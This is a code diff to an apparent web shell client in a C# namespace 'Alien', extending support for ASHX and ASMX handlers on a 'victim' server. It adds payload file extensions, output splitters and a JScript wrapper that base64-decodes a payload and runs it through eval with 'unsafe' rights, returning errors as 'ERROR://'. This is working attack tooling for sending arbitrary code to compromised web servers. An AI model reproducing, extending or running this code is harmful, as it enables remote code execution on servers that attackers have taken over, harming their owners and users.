@@ -56,10 +56,10 @@ namespace Alien
             { enLanguage.PHP, "php" },
             { enLanguage.ASP, "asp" },
             { enLanguage.ASPX, "aspx" },
-            { enLanguage.ASMX, "asmx" },
-            { enLanguage.ASHX, "ashx" },
-            { enLanguage.JSP, "java" },
-            { enLanguage.JSPX, "jspx" },
+            { enLanguage.ASMX, "aspx" },
+            { enLanguage.ASHX, "aspx" },
+            { enLanguage.JSP, "jsp" },
+            { enLanguage.JSPX, "jsp" },
             { enLanguage.Perl, "pl" },
             { enLanguage.Python, "py" },
             { enLanguage.Ruby, "rb" },
@@ -84,6 +84,22 @@ namespace Alien
             },
             {
                 enLanguage.ASPX,
+                type => type switch
+                {
+                    "JScript" => fnWrapJScript,
+                    _ => throw new NotSupportedException()
+                }
+            },
+            {
+                enLanguage.ASMX,
+                type => type switch
+                {
+                    "JScript" => fnWrapJScript,
+                    _ => throw new NotSupportedException()
+                }
+            },
+            {
+                enLanguage.ASHX,
                 type => type switch
                 {
                     "JScript" => fnWrapJScript,
@@ -140,6 +156,20 @@ namespace Alien
                 }
             },
             {
+                enLanguage.ASHX,
+                new string[]
+                {
+                    "<%", "%>",
+                }
+            },
+            {
+                enLanguage.ASMX,
+                new string[]
+                {
+                    "<%", "%>",
+                }
+            },
+            {
                 enLanguage.Perl,
                 new string[]
                 {
@@ -178,6 +208,28 @@ namespace Alien
             },
             {
                 enLanguage.ASPX, (type) =>
+                {
+                    if (type == "JScript")
+                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
+                    else if (type == "CSharp")
+                        return string.Empty;
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.ASHX, (type) =>
+                {
+                    if (type == "JScript")
+                        return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
+                    else if (type == "CSharp")
+                        return string.Empty;
+
+                    return null;
+                }
+            },
+            {
+                enLanguage.ASMX, (type) =>
                 {
                     if (type == "JScript")
                         return @"var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(""[PATTERN]"")),""unsafe"");}catch(err){Response.Write(""ERROR://""+err.message);}Response.End();";
@@ -231,6 +283,8 @@ namespace Alien
             { enLanguage.PHP, "echo(\"[SPLITTER]\");" },
             { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
             { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" },
+            { enLanguage.ASHX, "Response.Write(\"[SPLITTER]\");" },
+            { enLanguage.ASMX, "Response.Write(\"[SPLITTER]\");" },
             { enLanguage.Perl, "print \"[SPLITTER]\";" },
             { enLanguage.Ruby, "print \"[SPLITTER]\";" },
             { enLanguage.JSP, "echo(\"[SPLITTER]\");" },
@@ -242,6 +296,8 @@ namespace Alien
             { enLanguage.PHP, clsEzData.fnszStre2b64 },
             { enLanguage.ASP, clsEzData.fnszStre2b64 },
             { enLanguage.ASPX, clsEzData.fnszStre2b64 },
+            { enLanguage.ASHX, clsEzData.fnszStre2b64 },
+            { enLanguage.ASMX, clsEzData.fnszStre2b64 },
             { enLanguage.JSP, szInput => szInput } // nop
         };
 
@@ -941,7 +997,7 @@ namespace Alien
         /// <returns>Payload content</returns>
         private async Task<string> fnGetPayload(string szPayloadName, string szSplitter, string[] asParams = null)
         {
-            string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
+            string szSuffix = m_dicPayloadExtension[m_victim.ShellLanguage];
             string szPayloadFilePath = Path.Combine(new string[]
             {
                 "Payload",
@@ -1175,7 +1231,7 @@ namespace Alien
             szProcessed = Regex.Replace(szProcessed, @"Response\.Write", "Echo", RegexOptions.IgnoreCase);
             szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
 
-            if (szProcessed == "*")
+            if (szEncryptor == "*")
                 return szProcessed;
 
             string szHeader =
